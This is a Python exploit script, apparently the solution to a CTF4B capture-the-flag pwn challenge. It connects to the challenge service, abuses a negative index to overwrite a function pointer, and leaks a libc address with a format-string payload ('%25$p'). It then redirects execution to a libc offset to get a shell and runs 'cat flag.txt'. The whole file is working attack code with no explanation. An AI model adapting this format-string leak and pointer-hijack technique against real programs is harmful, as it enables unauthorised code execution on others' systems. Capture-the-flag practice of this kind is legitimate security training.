import socket
import os
import struct

def recvuntil(token):
    o = b''
    while True:
        o += s.recv(1)
        if token in o:
            break
    return o

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = os.getenv('CTF4B_PORT', '9003')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, int(PORT)))

recvuntil(b': ')
s.send(b'-2\n')
recvuntil(b': ')
s.send(b'6295608\n')

recvuntil(b': ')
s.send(struct.pack('<Q', 0xdeadbeef) + struct.pack('<Q', 0x400590) + b'\n')
recvuntil(b': ')
s.send(b'%25$p\n')
libc_base = int(s.recv(14), 16) - 137904 - 0xe7
print("libc = " + hex(libc_base))

recvuntil(b': ')
s.send(struct.pack('<Q', 0xdeadbeef) + struct.pack('<Q', libc_base + 324672) + b'\n')
recvuntil(b': ')
s.send(b"/bin/sh\0")
recvuntil(b'value: ')
s.send(b'cat flag.txt\n')
print(s.recv(4096))

s.close()

